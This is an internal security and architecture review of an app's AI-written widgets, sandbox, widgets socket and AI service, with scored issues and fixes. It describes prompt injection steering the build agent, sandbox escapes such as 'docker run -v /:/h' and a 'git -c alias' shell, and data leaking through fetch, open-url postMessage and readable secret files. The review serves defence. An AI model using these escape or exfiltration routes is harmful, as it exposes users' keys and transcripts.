# 11 Magic widgets, their sandbox and the AI service

**Score: 4/10** · reviewed 2026-10-10 against commit ddb7832 · scope: AI-written widgets (build, run, frame, store), their sandbox and policy, the widgets socket, `AiService` and its backends, and Jam's use of them

| Dimension | Score | One line |
|---|---|---|
| Structure & boundaries | 6/10 | Clean seams (folder = package, `Previewer`, `Backend`, one `AiService`), but `MagicService` holds seven concerns |
| Correctness & robustness | 7/10 | Health, backoff, revisions and rollback are careful; sandbox fails closed |
| Performance | 6/10 | Fine at rest; builds are unbounded in tokens and pay fixed preview waits |
| Security | 3/10 | Capabilities are written by the model and applied with no grant; the sandbox leaves the network open; the widgets socket ignores the identity it checks |
| Testability & tests | 6/10 | 103 tests over the 9 test files; nothing tests an escalation, a permission change or socket scoping |
| Extensibility | 6/10 | Manifest, kits and `Previewer` are the right shapes for a store; the consent step the store needs is missing |
| Code health | 6/10 | Terse and well commented; a v1 path, an eval-only module in `core/src` and three copies of the frame host |

## What this system is

A Magic widget is a folder under `$CMD_HOME/widgets/<id>/` (`widgets/store.ts`, 318 lines): `manifest.json` (title, size, refresh, `permissions {net, run, env, read}`, config, `media`, `kit`; parsed by `widgets/manifest.ts`, 130), `data.ts` (Deno), `view.html`/`view.ts` (the frame), fixtures and numbered revisions. `MagicService` (`magic/service.ts`, 864) runs a build per window: `buildWidget` (`magic/build.ts`, 200) drives an agent loop through `AiService.backend()` with read-only exploration tools (`magic/tools.ts`, 172: `run`, `read`, `list`, `fetch`) and widget tools (`magic/widget-tools.ts`, 184: write/edit files, `check`, `run_data`, `preview`), then `verifyWidget` (`widgets/verify.ts`, 115) type-checks, runs data.ts and renders every case, sending problems back up to twice. Code runs in two places. `data.ts` runs in Deno (`widgets/deno.ts`, 209) with flags built from the manifest, wrapped in `sandbox-exec` with a profile that denies writes and private paths (`magic/sandbox.ts`, 208). Agent `run` commands are classified by a shell parser with allow/ask/deny rules (`magic/policy.ts`, 399) and run under the same profile. The view runs in a `sandbox="allow-scripts"` iframe on `cmd-widget://frame/<kit>/` with a CSP that blocks the network; `prompt/host.js` (421) is the in-frame `cmd` runtime, and the renderer's `WidgetFrame` (`components/MagicView.tsx`, 508) relays postMessages. `data.ts` can read the event log through `widgets.sock` with a 60 s token (`data/widgets.ts`, 46; `core.ts:1360-1372`). `AiService` (`ai/service.ts`, 382) owns keys, model choice per tier, a background limiter and the `ai.call` record; `ai/backends.ts` (213) wraps the Vercel AI SDK for Anthropic and OpenAI; `ai/context.ts` (125) builds budgeted, redacted input for journal, summaries and notifications. Jam (`jam/change.ts`, 174, plus 141 KB of prompt markdown) is a window type whose AI edits Strudel code through `AiService.object`, played in its own sandboxed frame (`apps/desktop/src/jam/frame.js`). Design: docs/12, docs/14 (v2), docs/16 (library), docs/17 (AI), docs/28 §4 and C4 (widgets reading the log).

## What is good

- **One AI front door.** Every model call in core and CLI goes through `AiService` (grep for `generateText|streamText|@ai-sdk` outside `ai/`: 0 files). Purposes are named (9 distinct), background calls share a limit of 2, and auth failures mark the provider. Other systems that call out (remote, update checks) should copy this shape.
- **Fail-closed sandbox.** When `sandbox-exec` can't apply (inside another sandbox), commands are refused unless `CMD_MAGIC_UNSANDBOXED=1` (`sandbox.ts:138-148`). That is the right default.
- **The view frame is properly isolated:** opaque origin (no `allow-same-origin`), CSP with no network, media origins opened only by a per-window consent (`MediaRequest`, `magic.media`) and an unguessable frame token, so a widget can't navigate itself to a looser CSP. The media consent is the pattern the rest of the capability model should copy.
- **Typed data contract.** `cmd.ts` schemas plus `deno check` of `view.ts` against `data.ts` catch "written against one sample" at build time; runtime validation keeps the last good data on screen with honest health.
- **Revisions and rollback.** A failed build checks out the last good revision; hand edits become revisions. Kit 1 is frozen by test (`kits.test.ts`), so old widgets keep their look.
- **Context builder** (`ai/context.ts`): named parts, a budget by weight, redaction and a provenance record on every `ai.call`. Magic and Jam don't need it, but any new feature reading cmd's data should.
- **Secrets stay out of the folder** (`widgets/secrets.ts`, mode 0600) and out of what the model sees.

## Issues

### AR1-11-01 · Grant widget capabilities from the person, not from the model's manifest

- **Status:** open
- **Severity:** critical
- **Effort:** L
- **Where:** `packages/core/src/widgets/manifest.ts:51`, `packages/core/src/widgets/deno.ts:154-170`, `packages/core/src/widgets/deno.ts:185`, `packages/core/widget-runtime/cmd.ts:223-250`, `packages/core/src/magic/service.ts:266-340`, `packages/core/src/magic/service.ts:681-735`, `apps/desktop/src/renderer/src/components/MagicEditor.tsx:211`

**Problem.** `manifest.json` is written by the model, and its `permissions` become Deno flags on the next run with no one approving them: during the build (`run_data`), right after it (the window starts refreshing), after `magic.fix`, after `magic.autoFix` (background, nobody watching), and after any hand edit cmd notices (`#edited`). A request like "a widget for my repos", or a fetched page that steers the agent, can end with `net: ["*"]`, `read: ["~"]` and `run: ["docker"]`, and that runs every few seconds. The permissions are only *shown* after the fact, in ⌘E (`MagicEditor.tsx:211`). Three holes make the declared list wider than it reads. First, `permissions.env` is added to the sandbox's keep list (`deno.ts:185`), so a widget that declares `OPENAI_API_KEY` or `AWS_SECRET_ACCESS_KEY` gets it from the core's environment past `cleanEnv`'s secret scrub. Second, `ESCAPES` blocks shells and interpreters, but `docker`, `kubectl`, `git` and `gh` are allowed. `run()` in `cmd.ts` hands any argv to `Deno.Command`, never through `policy.ts`, so `docker run -v /:/h …` writes outside the sandbox (the daemon isn't sandboxed), and `git -c alias.x='!…'` runs a shell. Third, `read` takes any folder, `~` included. docs/14 §"Toward a store" plans "show the permissions at install; an update that adds permissions asks again", but the widgets cmd builds itself skip that step.

**Evidence.** `grep -rn "approv\|consent\|grant" packages/core/src/magic packages/core/src/widgets` returns nothing; the only consent in the renderer is `MediaRequest` (MagicView.tsx:322). `ESCAPES` (manifest.ts:51) has 17 names, none of them `docker`, `kubectl`, `git`, `gh`, `glab`, `ssh`, `find`, `awk`. `runData` passes `credentials: { env: [...keep.env, ...m.permissions.env] }` and `execArgvNow` builds the env as `cleanEnv(process.env, o.credentials?.env)`. In the agent's `run` tool, `docker` is limited to `ps, images, info, …` (policy.ts READ_ONLY). The same program in a widget's `run()` has no rule at all.

**Proposal.** Use the MCP Apps / Zed model (00-research §7: capabilities declared, scoped and granted by the user, failing closed):
1. **Grants live outside the folder.** Keep a `granted` capability set in `widget.json`, which agents can't write (store.ts already keeps it out of `WIDGET_FILES`). The Deno flags are built from `manifest ∩ granted`, never from the manifest alone.
2. **A diff asks.** When a revision's manifest asks for more than is granted (new host, program, env name, folder, or `*`), the window shows a consent sheet like `MediaRequest`: "This widget wants to reach api.github.com and run gh". It keeps running the last granted set until someone answers. During a build, `run_data` runs with the request's capabilities only after the person approves them in the build view, or runs offline against fixtures until then. autoFix and hand edits never widen grants.
3. **`run()` goes through the core.** Replace `--allow-run` with a `widget.run` method on the widgets socket. The core classifies the argv with `policy.ts` (the same rules as the agent's `run` tool, including `docker`'s read-only subcommands and `git -c` refusal) and runs it with `execArgv` under the profile. One policy then covers agents and widgets, and `ESCAPES` goes away.
4. **`env` takes only names the person typed.** Better, drop it in favour of `secret` config fields, which already exist.

**Success criteria.**
- [ ] A test builds a widget whose manifest adds `net: ["*"]` in a new revision; `denoRunArgs` for that window still has the previous hosts until a `magic.grant` call; the renderer shows a consent sheet (e2e screenshot).
- [ ] `grep -n "allow-run" packages/core/src/widgets/deno.ts` returns nothing; `run("docker", ["run", …])` from data.ts fails with policy.ts's reason (test).
- [ ] A widget declaring `env: ["OPENAI_API_KEY"]` does not see that variable unless the person granted it (test).
- [ ] autoFix and a hand edit that widen permissions leave `granted` unchanged (test).

### AR1-11-02 · Scope the widgets socket by the identity it already checks

- **Status:** open
- **Severity:** high
- **Effort:** M
- **Where:** `packages/core/src/core.ts:1360-1372`, `packages/core/src/data/widgets.ts:20-46`, `packages/core/src/widgets/deno.ts:154-170`, `packages/core/src/magic/service.ts:596-597`

**Problem.** `widget.hello` resolves a token to `{widgetId, workspaceId}` and stores it, and then `data.query` ignores it: `this.data.query(widgetQuery(params.query))`, where `widgetQuery` only caps `limit` at 1000. Any widget's data.ts can page through the whole log with `after` and run FTS over it (`text`). That covers every workspace and every class: transcripts, commands with their output, `ai.call` records, `user.*` focus events, `remote.audit`. Every data run gets a token whether or not the widget uses `events()`. Tokens live 60 s, are reusable within that time and are not revoked when the run ends. docs/28 C4 specifies a policy table (`data/policy.ts`: "widgets: read-only, their workspace, no blobs unless declared"), enforced in the query layer. That file does not exist. Combined with AR1-11-01 (`net: ["*"]` with no grant), a model-written widget can send the person's transcripts anywhere.

**Evidence.** `ls packages/core/src/data/` has no `policy.ts`. `#widgetCall` reads `who` only to check it is non-null. `runData` is always passed `socket: sock ? {path, token: sock.token(...)} : null` (service.ts:597). There is no `permissions.events` or similar in `WidgetManifest`. The one test (`widgets.test.ts:177`) checks that reading works, not what is refused.

**Proposal.** Build the C4 policy as docs/28 describes, starting with the widget row. The identity forces `workspaceId` (or requires a granted `events: "all-workspaces"`), restricts types to a declared and granted list (`events: ["command", "agent.*"]`), excludes `transcript.*`, `ai.*`, `user.*` and `remote.*` unless granted, and never returns content. Issue a token only when the manifest declares `events`. Delete it when `runData` settles. Put the policy in the query layer so the remote client (doc 12) and agents use the same table. The data layer's own design is doc 06's scope; this issue is the widget row and the token lifecycle.

**Success criteria.**
- [ ] A test: a widget in workspace A queries without `workspaceId` and gets only A's events; asking for `transcript.message` without a grant throws.
- [ ] A widget whose manifest has no `events` gets no `CMD_WIDGET_TOKEN` in its env (test on `denoRunArgs`/`runData` options).
- [ ] `widgetTokens.check(token)` returns null right after the run that got it finished (test).
- [ ] `packages/core/src/data/policy.ts` exists and `#widgetCall` routes through it.

### AR1-11-03 · Close the network in the sandbox profile and the agent's `fetch`

- **Status:** open
- **Severity:** high
- **Effort:** M
- **Where:** `packages/core/src/magic/sandbox.ts:85-107`, `packages/core/src/magic/policy.ts:182`, `packages/core/src/magic/policy.ts:196-204`, `packages/core/src/magic/tools.ts:149-165`

**Problem.** The build agent has all three legs of the "lethal trifecta". It reads private data: `read`, `list` and `run` over everything outside the 23 deny paths, which includes `~/src` and `~/Documents`. It takes in untrusted content: `fetch` on any URL, plus command output. And it can send data out: `fetch` GET to any host with any query string, `curl` GET, `dig`/`nslookup`/`host` (DNS). The sandbox profile is `(allow default)` minus writes and private reads, so every sandboxed command, and every program data.ts runs, has the full network. `fetch` runs in the core process itself (not sandboxed) and follows redirects to `127.0.0.1`, `169.254.169.254` or LAN hosts. The policy's own header says it is "best-effort; the sandbox is what actually prevents writes". Nothing prevents sending.

**Evidence.** `sandboxProfile` emits `(allow default)`, `(deny file-write*)`, `(deny file-read* …)` and `(deny process-exec …)`. There is no `network` rule (`grep -c network packages/core/src/magic/sandbox.ts` = 0). `READ_ONLY` allows `curl` (GET), `dig`, `nslookup`, `host`, `ping -c ≤5`. `tools.ts:153` has `fetch(url, { redirect: "follow" })` with only an `^https?://` check.

**Proposal.** Treat network as a capability like files. In the profile, add `(deny network-outbound)` with `(allow network-outbound (remote unix-socket))` for the widgets socket, and open `(remote tcp "*:443")` only for credentialed CLIs (`gh`, `glab`, `kubectl`, `tailscale`) and Deno itself. Deno's own `--allow-net=<granted hosts>` then does the host filtering, since `sandbox-exec` can't match hostnames. In `policy.ts`, move `curl`, `dig`, `nslookup`, `host`, `ping` to "ask". For the agent's `fetch`, refuse loopback, link-local and private ranges after DNS resolution (and on every redirect). Once the agent has read a local file or command output in this build, allow only hosts already fetched or named in the request. Claude Code's web-fetch domain approval is the prior art. Add two evals to `evals/cases.json`, a prompt-injection page and a "send my repo list to X" request, that pass only if no outbound request carries local content.

**Success criteria.**
- [ ] `sandboxProfile(...)` contains `(deny network-outbound)`; a test running `curl https://example.com` under it fails, and `gh auth status` still works (skipIf no sandbox).
- [ ] `classify("curl https://x/?q=1")` is `ask` (test).
- [ ] The `fetch` tool refuses `http://127.0.0.1:…`, `http://169.254.169.254/` and a redirect to either (test with a local server).
- [ ] `cases.json` has at least two injection/exfiltration cases tagged `security`, and `cmd magic eval --tag security` reports them.

### AR1-11-04 · Pin, verify and ask before installing Deno

- **Status:** in progress (deno-pin)
- **Severity:** high
- **Effort:** S
- **Where:** `packages/core/src/widgets/deno.ts:46-62`, `packages/core/src/magic/service.ts:268-280`

**Problem.** On the first widget build on a Mac without Deno, the core downloads `releases/latest/download/deno-<arch>-apple-darwin.zip` from GitHub, unzips it into `$CMD_HOME/runtime/deno` and runs it. It does this without asking, with no version pin and no checksum or signature check. "Latest" changes under cmd: a Deno release that changes permission flags (the `unix:` net form is already handled by guesswork in `denoRunArgs`) or `deno check` output breaks every widget at once, on every Mac at a different time. A tampered release, or a compromised redirect, would be executed by the core.

**Evidence.** `const url = \`https://github.com/denoland/deno/releases/latest/download/deno-${arch}-apple-darwin.zip\`` (deno.ts:49); no hash anywhere in `deno.ts` (`grep -c sha deno.ts` = 0); the install is a build step labelled "Installing Deno for widgets (once)" that starts without a prompt (service.ts:270).

**Proposal.** Pin a Deno version and its SHA-256 for both archs in a constant (or `packages/core/deno.lock.json`), download that exact asset, check the hash before unzipping, and check `codesign -v` on the binary. Ask once ("Widgets with live data need Deno (40 MB). Download it?"), as `magic.installRuntime` already offers from Settings. Bumping the pin is then a reviewed change with the widget tests run against it (`widgets.test.ts` runs only when Deno exists: `describe.skipIf(!DENO)` ×3, so CI should install the pinned version). Bundling Deno in the app is the stronger route but adds roughly 40 MB per arch. Packaging is doc 14's call.

**Success criteria.**
- [ ] `installDeno` fails on a hash mismatch (test with a fake `fetchImpl`).
- [ ] `grep -n "releases/latest" packages/core/src/widgets/deno.ts` returns nothing.
- [ ] A build on a Mac without Deno shows a question before any download (e2e or `magic.test.ts` with an injected installer).
- [ ] CI installs the pinned Deno, and the three `skipIf(!DENO)` suites run there (see doc 13).

### AR1-11-05 · Enforce frame actions in the renderer, and share one frame host

- **Status:** open
- **Severity:** medium
- **Effort:** M
- **Where:** `apps/desktop/src/renderer/src/components/MagicView.tsx:395-427`, `packages/core/src/magic/prompt/host.js:229-290`, `apps/desktop/src/renderer/src/components/JamView.tsx:289-312`, `apps/desktop/src/renderer/src/components/VisualizerView.tsx:82-102`

**Problem.** `host.js` sends `open-url`, `terminal` and `open` only after a click while the window is active ("so code that runs on every refresh can't open terminals"). But host.js runs in the same frame as the model's script, so the view can call `parent.postMessage({type:"open-url", url:"https://x/?d=…"}, "*")` directly. The renderer checks only the source window and a once-a-second rate (`often(lastAct)`), and checks nothing for `open-url`. A view can therefore open a browser window to any URL carrying its data (the frame CSP blocks fetch, but not this). It can also type a command into a new terminal once a second, which the person then only has to press Return on. The gesture and active rules belong in the trusted side. Separately, the same relay (source check, `postMessage(m, "*")`, a type switch) is written three times, for Magic, Jam and Visualizer.

**Evidence.** In `onMessage` (MagicView.tsx:404-424), `open-url` is accepted when `typeof m.url === "string" && /^https?:\/\//i.test(m.url)`, with no `active` or rate check. `terminal`/`open` are gated only by `!often(lastAct)`. `activeRef` exists in the component but is used only to post `active` into the frame. Three `onMessage` handlers have the comment "only from our own frame (opaque origins all say "null")".

**Proposal.** Move the rule to the renderer. Accept an action message only if the window is active and the iframe received a `pointerdown` within the last second. Track it by listening for `pointerdown` on the iframe element's parent and `blur` on the window, the standard trick for detecting a click into a cross-origin frame. Apply the rate limit to `open-url` too. Then extract a `FrameHost` hook in `@cmd/ui` or `renderer/src/frames.ts` (source check, typed message table, `post`, gesture gate) used by the three views. Each view keeps only its handlers. This matches MCP Apps' rule that "all host communication via postMessage JSON-RPC, host can restrict tool calls" (00-research §2, §7).

**Success criteria.**
- [ ] An e2e or renderer test: a widget whose script posts `open-url` on load opens nothing; the same after a click on the frame opens one window.
- [ ] `grep -c "opaque origins all say" apps/desktop/src/renderer/src/components/*.tsx` = 0 (one shared host).
- [ ] `open-url` is rate-limited like `terminal` (test).

### AR1-11-06 · Account for cost and cap what a build may spend

- **Status:** open
- **Severity:** medium
- **Effort:** M
- **Where:** `packages/core/src/ai/backends.ts:13-20`, `packages/core/src/ai/backends.ts:117`, `packages/core/src/magic/build.ts:162-197`, `packages/core/src/magic/service.ts:681-697`, `packages/core/src/ai/models.ts`

**Problem.** docs/17 promises "usage and cost totals per purpose". `Usage.costUSD` exists but is never set: build.ts sums it from `r.usage.costUSD`, and no code anywhere computes one. So `cmd data ai` can only count tokens, and nobody, the person included, sees what Magic costs. A build has no ceiling except steps. It gets 40 tool turns plus up to 2 repairs of 15, so 70 model calls. Each call resends the growing transcript with PNG screenshots from `preview`, and each step may emit 32 000 output tokens. `magic.autoFix` starts such a build in the background when data fails three times. There is no spend limit per build, per day or per purpose, and no overall timeout on the agent loop beyond the person pressing Stop.

**Evidence.** `grep -rn "costUSD" packages/core/src packages/cli/src` finds only the type and the summing in build.ts (2 lines). `stopWhen: stepCountIs(r.maxSteps + 1)` and `maxOutputTokens: 32_000` are the only bounds (backends.ts:114-117). `BACKGROUND_LIMIT = 2` limits concurrency, not volume.

**Proposal.** Add prices to `models.ts`: a table per model family, input/output/cache read/cache write per Mtok, updated with the fallback list. Compute `costUSD` in `usageOf`, record it in `ai.call`, and show it per purpose in `cmd data ai` and Settings → AI. Give `AiService` a budget: `ai.dailyBudgetUSD` (setting) checked in `#choose` for background purposes, and a per-call `maxTokens` budget for agent loops. `buildWidget` stops with "This widget used its budget" once the build's tokens pass the limit (default: something like 400k input). A cheap first step that needs no prices is a token ceiling per build.

**Success criteria.**
- [ ] `usageOf` returns `costUSD` for every model in `FALLBACK_MODELS` (test).
- [ ] `cmd data ai` prints a cost column per purpose.
- [ ] A fake backend that never stops calling tools ends a build at the token ceiling with a clear error (test in `magic.test.ts`).
- [ ] With `ai.dailyBudgetUSD` reached, background purposes (`notify.*`, `journal.*`, autoFix) throw a typed error and foreground ones still run (test).

### AR1-11-07 · Version prompts and record them by id, not by copying them into every `ai.call`

- **Status:** open
- **Severity:** medium
- **Effort:** M
- **Where:** `packages/core/src/ai/service.ts:340-372`, `packages/core/src/core.ts:376-380`, `packages/core/src/jam/change.ts:90`, `packages/core/src/magic/prompt/prompt.md`, `packages/core/src/magic/evals/cases.json`

**Problem.** `complete` and `object` record `input = system + "---" + prompt` as the event's content. Jam's system prompt is six markdown files, 141 KB (≈35k tokens: reference.md alone is 102 920 bytes), so every "more swing" stores about 141 KB of identical text in `events.sqlite` under the `ai` class (cap 1 MB, a year's retention by default). Meanwhile the one thing worth recording, which prompt *version* produced an answer, is not recorded at all. Magic's prompt (`prompt.md` + 9 examples + kit CSS) and Jam's carry no version or hash in `ai.call`. A regression after a prompt edit can't be traced to it, and the evals (`cmd magic eval`: 18 cases; `scripts/jam/eval.ts`) run by hand only and have no baseline to compare against.

**Evidence.** `inputText = (o) => (o.system ? \`${o.system}\n\n---\n\n\` : "") + o.prompt` (service.ts:372). `wc -c packages/core/src/jam/*.md` = 143 786 bytes. `ai.call`'s `data` holds purpose, provider, model, tier, ms, tokens and context, with no prompt id. `.github/workflows/build.yml` runs `pnpm test` only, with no eval or prompt check.

**Proposal.** Register prompts: `ai/prompts.ts` maps a name (`magic.system`, `jam.system`, `notify.system`) to its text and a content hash computed at load. Calls pass `promptId` instead of a raw system string. `ai.call` records `{promptId, promptHash}` and stores only the user prompt and output as content. The system text is kept once as a blob keyed by its hash (the data layer's blobs are already content-addressed, doc 06). Each eval report records the prompt hash it ran with and is kept, so `cmd magic eval --compare <hash>` is possible. In CI, a no-model check: the 9 prompt examples pass `verifyWidget` with fixtures (types, render), so prompt edits can't ship broken examples.

**Success criteria.**
- [ ] Two consecutive `jam.change` calls add less than 20 KB of content to the log in total (test with a fake backend and an in-memory data service).
- [ ] Every `ai.call` event has `data.promptHash` (test).
- [ ] A CI test runs `verifyWidget` on every `prompt/examples/*` folder (skipIf no Deno, with Deno pinned per AR1-11-04).
- [ ] `cmd magic eval` writes the prompt hash into its report.

### AR1-11-08 · Split `MagicService` and delete the v1 path

- **Status:** open
- **Severity:** medium
- **Effort:** M
- **Where:** `packages/core/src/magic/service.ts:108-850`, `packages/core/src/magic/sources.ts`, `packages/core/src/magic/service.ts:611-616`, `packages/core/src/magic/service.ts:824-850`

**Problem.** `MagicService` (864 lines, 11 private maps and sets of per-window state) holds seven concerns. It orchestrates builds (`run`, `fix`, the Deno install, progress events), schedules data with health and backoff (`#schedule`, `#tick*`, `#afterRun`, `#signals`), auto-fixes, watches widget folders for hand edits, manages the library (rename, duplicate, delete, `opened`, `#removed`), handles window config, secrets, state and media, and runs two migrations (v1 sources, `widgets/closed`). The `run()` method alone is 160 lines. Each feature in docs/16 lands here, and the state maps must be cleaned in `#removed` and `dispose` by hand. v1 widgets (a shell command or URL in window state, refreshed by `sources.ts` through `classify`) still have a live refresh path. That is a second, older execution model with its own policy surface.

**Evidence.** `grep -c "legacy\|Legacy\|v1\|source" service.ts` = 13. `#runs, #timers, #failures, #persistedAt, #watchers, #editTimers, #widgetOf, #building, #autoFixed, #parked` all keyed per window or widget. `sources.ts` (104 lines) is used only by `#tickLegacy` and two other call sites.

**Proposal.** Three classes behind the existing RPC: `WidgetBuilds` (run/fix/cancel, progress, autoFix policy), `WidgetRunner` (one record per window holding timer, abort, failures and persistedAt instead of five maps; refresh, backoff, signals) and `WidgetLibrary` (list/rename/duplicate/delete, watchers, migrations). `MagicService` becomes the facade that wires them, as doc 03's per-feature handler modules suggest (AR1-03-01). Retire v1: on startup, convert every v1 window to a widget folder with `static.json` or a `data.ts` generated from its source (the `refineRequest` path already rebuilds them on the first change), then delete `sources.ts` and `#tickLegacy`.

**Success criteria.**
- [ ] `wc -l packages/core/src/magic/service.ts` < 350, and no new file > 400.
- [ ] `packages/core/src/magic/sources.ts` is gone; `grep -rn "tickLegacy\|runSource" packages/core/src` returns nothing.
- [ ] A test opens a v1 window state and gets a widget folder that renders.
- [ ] `WidgetRunner` has its own tests for backoff and `Retry-After` without a `MagicService`.

### AR1-11-09 · Make previews wait for "rendered", not a fixed 500 ms per case

- **Status:** open
- **Severity:** low
- **Effort:** S
- **Where:** `packages/core/src/widgets/preview.ts:86-96`, `packages/core/src/widgets/preview.ts:147-178`, `apps/desktop/src/main/preview.ts`

**Problem.** Every `verifyWidget` renders 4 live cases plus one per fixture, and the Playwright previewer launches a new Chromium per batch and waits a flat `waitForTimeout(500)` per page. With two fixtures that is at least 3 s of sleeping per verify. A build verifies up to 3 times and the agent calls `preview` on its own besides, so a build spends 10 s or more waiting. The in-app previewer (main) has the same shape. host.js already posts `rendered` when the view has painted, and the app uses it to unhide frames.

**Evidence.** `await page.waitForTimeout(500)` (preview.ts:167); `chromium.launch()` inside `render()` (preview.ts:157); `previewCases` pushes 4 fixed cases plus fixtures (preview.ts:90-95).

**Proposal.** Expose a promise in the standalone page (`window.__CMD_RENDERED__`, resolved by host.js where it posts `rendered`) and `await page.waitForFunction(...)` with a 1.5 s cap. Keep one Chromium per previewer for a few minutes instead of one per batch. Do the same in `main/preview.ts`.

**Success criteria.**
- [ ] `grep -n "waitForTimeout" packages/core/src/widgets/preview.ts` returns nothing.
- [ ] `verifyWidget` on the weather example with two fixtures runs under 1.5 s on the Playwright previewer (logged `ms`, measured once in the PR).

### AR1-11-10 · Keep Jam's eval code out of the core runtime

- **Status:** open
- **Severity:** low
- **Effort:** S
- **Where:** `packages/core/src/jam/analyze.ts`, `packages/core/src/jam/atlas.json`, `scripts/jam/eval.ts`

**Problem.** Jam is mostly on the shared rails. It is a window type in `windows/builtin.ts`, its AI goes through `AiService.object` with `cacheSystem` and a purpose, and its frame is an opaque-origin page through the same `frameHandler` as the Visualizer. Two things don't fit. `jam/analyze.ts` (225 lines) is used only by `scripts/jam/eval.ts`, `scripts/jam/browser.ts` and its test, yet ships in the core's runtime tree. And `atlas.json` (250 KB) is loaded only to list sample names the prompt doesn't already cover. Jam should not become a Magic widget: it is a live-edited program, not a data/view pair. Its frame relay is one of the three in AR1-11-05.

**Evidence.** `grep -rln "jam/analyze" packages apps scripts` gives `packages/core/test/jam-analyze.test.ts`, `scripts/jam/eval.ts` and `scripts/jam/browser.ts`, with no runtime importer.

**Proposal.** Move `analyze.ts` (and its test) to `scripts/jam/`. Generate the atlas names into a small `atlas-names.json` at `scripts/jam-atlas.mjs` time, and stop shipping `atlas.json` in `stage-runtime.mjs` (doc 14).

**Success criteria.**
- [ ] `ls packages/core/src/jam/analyze.ts` fails; `pnpm vitest run` still passes its tests from their new place.
- [ ] The staged runtime contains no `atlas.json`.

### AR1-11-11 · Keep cmd's own secrets out of reach of Magic's tools

- **Status:** in progress (magic-private-paths)
- **Severity:** high
- **Effort:** S (< ½ day)
- **Where:** `packages/core/src/paths-deny.ts`, `packages/core/src/magic/tools.ts:104,129`, `packages/core/src/magic/sandbox.ts`

**Problem.** AR1-12-01 (done in 81ec82c2) moved the private paths into `paths-deny.ts` and denies cmd's state and config dirs to remote devices, but not to Magic, because Magic's widgets, their fixtures and Deno itself live under `$CMD_HOME`. So the build agent's `read`/`list`/`run` tools can still read `$CMD_HOME/secrets.json` (the Anthropic/OpenAI keys), `remote/host.json` (the host's private key and relay secret), `widgets/*/secrets` and `~/.config/cmd`. With AR1-11-03's open network, a prompt-injected build can send them anywhere.

**Evidence.** `DEFAULT_DENY_PATHS` has no entry under `~/Library/Application Support/cmd*` or `~/.config/cmd`; `cmdPrivatePaths()` is used only by `remotePrivatePaths()`. Magic's tools check `ctx.deny`, built from `DEFAULT_DENY_PATHS`.

**Proposal.** Deny files, not the folder: add a `magicPrivatePaths()` listing `secrets.json`, `remote/`, `settings.json`, `cmd.sqlite*`, `data/`, `widgets/*/secrets*` and the logs under every instance dir (`cmdPrivatePaths()`), plus `~/.config/cmd`, and use it for the tools and the sandbox profile. Widgets, fixtures, the Deno runtime and its cache stay readable.

**Success criteria.**
- [x] A test: Magic's `read` tool on `$CMD_HOME/secrets.json` and `$CMD_HOME/remote/host.json` returns "private"; on a widget's `data.ts` it succeeds.
- [ ] The sandbox profile denies the same files (test where `sandbox-exec` is available).
  live check pending: run `pnpm vitest run packages/core/test/magic.test.ts` outside Agent Safehouse
- [x] `widgets.test.ts` (with Deno) still passes.

Not issues here: API keys in `secrets.json` rather than the Keychain: see doc 03 (AR1-03-08). The renderer that hosts widget frames running unsandboxed: see doc 09 (AR1-09-07). The event log's policy table as a whole, and `ai` retention: see doc 06.

## Course corrections

1. **A real capability model for widgets** (AR1-11-01, then AR1-11-02). Grants owned by the person and diffed on every revision, `run()` routed through the core's policy, and the widgets socket scoped by identity. This is the change the store plan in docs/14 needs anyway, and the one that moves Security from 3 to 7.
2. **Close the outbound channels** (AR1-11-03, AR1-11-05). Network denied in the profile except where granted, `fetch` refusing private addresses, and frame actions gated in the renderer. With course correction 1, a hostile page or prompt can no longer get data out.
3. **Make the runtime reproducible** (AR1-11-04). A pinned and verified Deno, installed only after asking, and run in CI.
4. **Make AI spend and prompts visible** (AR1-11-06, AR1-11-07). Cost per purpose, a build ceiling, prompt ids instead of 141 KB copies, and examples checked in CI.
5. **Then split `MagicService`** (AR1-11-08), so the grants and runner state from step 1 have their own homes rather than three more maps.

## Quick wins

AR1-11-11 (deny cmd's secrets to the tools), AR1-11-04 (pin and hash Deno), AR1-11-09 (wait for `rendered`), AR1-11-10 (move eval code out). Of AR1-11-05, the renderer-side `active` and rate check for `open-url` alone takes about an hour. Of AR1-11-02, revoking the token when the run ends, and issuing one only when the manifest declares `events`, together take under half a day.
